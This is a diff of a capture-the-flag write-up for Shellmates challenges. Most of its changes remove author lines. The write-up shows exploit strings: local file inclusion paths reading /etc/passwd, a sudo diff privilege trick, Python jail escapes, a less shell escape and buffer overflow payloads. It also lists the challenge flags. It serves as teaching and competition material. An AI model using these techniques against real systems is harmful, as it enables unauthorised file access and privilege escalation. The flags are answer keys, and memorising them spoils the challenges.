@@ -1,6 +1,5 @@
 Web
 baby lfi
-Author : Anis Chebah
 
 level: so easy
 
@@ -14,7 +13,6 @@ exploit : 'https://baby-lfi.challs.shellmates.club/?language=/etc/passwd'
 flag: shellmates{10CA1_F11e_1Nc1US10n_m4y_r3ve4l_in7Er3st1nG_iNf0Rm4t1on}
 
 lfi
-Author : Anis Chebah
 
 level: so easy
 
@@ -26,7 +24,6 @@ exploit : 'https://lfi.challs.shellmates.club/?language=/etc/passwd'
 flag: shellmates{SH0uLD_H4Ve_MadE_th3_checK_recuRS1V3}
 
 baby lfi 2
-Author : Anis Chebah
 
 level: so easy
 
@@ -40,7 +37,6 @@ exploit : 'https://baby-lfi-2.challs.shellmates.club/?language=./languages/../..
 flag: shellmates{yOU_M4De_yOUr_waY_7hRough_iT}
 
 HEADache
-Author : Muhammad
 
 level: so easy
 
@@ -54,7 +50,6 @@ exploit : add "Wanna-something: can-i-have-a-flag-please" in the http request
 flag : shellmates{hTTp_H34d37R5_&_p0L173N355_c4n_B3_U53FULL}
 
 Whois
-Author : souad
 
 level : medium
 
@@ -73,7 +68,6 @@ flag: shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll}
 Whois fixed
 A web-based Whois service
 Note : There was a problem with the first version, this is the fixed version.
-Author : souad
 
 level : medium
 
@@ -88,7 +82,6 @@ nextGen 1
 simple monitoring app.
 
 Note : Flag is in the /flag.txt file of the web server
-Author : souad
 
 level : easy
 
@@ -123,7 +116,6 @@ flag : shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}
 
 Linux
 diff
-Author : Ouxs
 
 the challenge is a linux container which contains the flag in the / directory but we don't have permission to read it. i checked for suid binaries but nothing, then i did sudo -l to list the commands that users can execute with sudo, i saw that we can execute diff with sudo with the username ctf-cracked, now we will just diff the flag with any other file to get the flag.
 exploit : sudo -u ctf-cracked diff flag.txt /etc/passwd
@@ -131,7 +123,6 @@ exploit : sudo -u ctf-cracked diff flag.txt /etc/passwd
 flag : shellmates{You_ma$tered_th3_t00L}
 
 remote
-Author : Ouxs
 
 the challenge is a linux container which contains the flag in the / directory but the ssh login script always exits instantly, so the trick is to execute a command before the login script, we can do it with ssh by adding the command as the last argument.
 exploit : ssh ctf@remote -o ProxyCommand="openssl s_client -quiet -connect remote.challs.shellmates.club:443 -servername remote.challs.shellmates.club" "cat /flag.txt"
@@ -139,14 +130,13 @@ exploit : ssh ctf@remote -o ProxyCommand="openssl s_client -quiet -connect remot
 flag : shellmates{HOW_DID_U_M4d3_i7_HERE!}
 
 Welcome
-Author : Ouxs
 
 the challenge is to find the flag in this linux container, we can see that the welcome message is diffrent comparing to other machines, so the first thing is to find how it is printing this message. after a while we found that the /etc/update-motd/01-custom contains the scripts that print the wellcome message, we can see a commented line contains f379bbf265604f3514cda4aadbc05137
 flag : shellmates{f379bbf265604f3514cda4aadbc05137}
 
 Jail
 baby jail 1
-Author : Ouxs
+
 
 the challenge is a custom python interpreter where we need to open and read the flag file.
 exploit : open("flag.txt").read()
@@ -154,7 +144,7 @@ exploit : open("flag.txt").read()
 flag : shellmates{D0n'7_m3$$_W17H_EVAL_kID0}
 
 baby jail 2
-Author : Ouxs
+
 
 the challenge is a custom python interpreter where the added some filters, if we print the globals we can see a BLACKLIST array containig blacklisted words, so i just clear that array then execute the same command of baby jail 1.
 exploit : BLACKLIST.clear() then open("flag.txt").read()
@@ -162,7 +152,7 @@ exploit : BLACKLIST.clear() then open("flag.txt").read()
 flag : shellmates{Y0u_ar3_st4rting_t0_g3t_g00d_with_LAVE}
 
 less_jail
-Author : 1m4D
+
 
 in this challenge when we ssh we get a less editor, we need just to execute a shell command by pressing on !, then cat the real flag
 exploit : ! then cat real_flag
@@ -170,7 +160,7 @@ exploit : ! then cat real_flag
 flag : shellmates{My_LE$$_J41L_1S_VERy_We4K_76423}
 
 pickle_games 1
-Author : chenx3n
+
 
 in this challenge they gave us a python script, which it reads a data in hex then deserialize it with pickle so the challenge here is to serialize an object that can lead us to the flag.
 #!/usr/bin/env python3
@@ -270,7 +260,7 @@ flag : shellmates{y0U_d0N'7_P4r3n7H3515_70_c4Ll_M3}
 
 PWN
 B0F0
-Author : 1m4D
+
 
 In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to change the date to 2752022 by using the buffer overflow. so i just coded the number in hex and add it after the bufferoverflow offset.
 from pwn import *
@@ -291,7 +281,7 @@ exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 flag : shellamtes{Y0u_H4vE_ChE4ngED_mY_V4R14Ble_98765}
 
 B0F0
-Author : 1m4D
+
 
 In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to ret addr to the open_shell function wich has the addr 0x080491b6 and pass the parameter (int)1337.
 from pwn import *
@@ -315,7 +305,7 @@ flag : shellamtes{Y0u_4lS0_GET_A_$HEll_65431}
 Crypto
 Steam Locomotive
 I wrote a message, but a train ran over it and messed it up, can you recover it? Do you know what the sl command do?
-Author : badsUwU
+
 
 In this challenge they gave us a file 'enc' which contains encrypted text, so we should just find which encryption method that they used, the challenge name is steam locomotive so the encryption method will be similar, after some research we can find the Rail Fence Cipher which did the trick for us.
 flag : shellmates{u$e_L$Not$l_t0_LI$T_7h3_con7En7_0f_4_diREC70rY}
@@ -325,7 +315,7 @@ level : easy/medium
 
 They say it's such a rookie mistake to do.
 Can you find it?
-Author : Ouxs
+
 
 In this challenge they gave us the script which they used to crete chall file wich contains the encrypted text, we can see that they used the RSA algorithm and we can see the q and e that we can use to encrypt the text.
 exploit : rsactftool -n {the N number} -e {the e number} -uncipher {the c}
@@ -334,7 +324,7 @@ flag : shellmates{F3RM47_H4S_Ju57_T0Ok_R$A_D0WN}
 
 Night Coder
 I am a night coder, are you? 
-Author : Chih3b
+
 
 In thi challenge they gave us a python script that seeds with current date then chuffles the flag, and we have the resultant flag, so in this case we should define unshuffle wich reverses shuffle function and brute force the seed(its around thursday at 00:00 until 12:00 (morning))
 import random 
@@ -403,6 +393,6 @@ forensics
 lies
 I asked my friend where is he, he lied to me through this picture, can you find the datetime of the pic and prove me right?
 Flag format shellmates{YY:MM:DD} 
-Author : Chih3b
+
 
 to be continued <<
